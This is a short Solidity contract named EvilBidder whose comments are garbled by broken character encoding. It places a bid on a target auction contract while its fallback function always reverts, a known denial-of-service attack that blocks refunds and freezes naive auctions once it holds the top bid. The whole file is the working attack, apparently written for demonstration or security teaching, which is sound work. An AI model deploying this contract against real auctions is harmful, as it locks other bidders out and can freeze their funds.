pragma solidity ^0.4.11;
contract  EvilBidder {
	/// Fallback�֐�
	function() payable{
		revert();
	}
		
	/// bid�p�̊֐�
	function bid(address _to) public payable {
		// bid���s��
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		} 
	}
}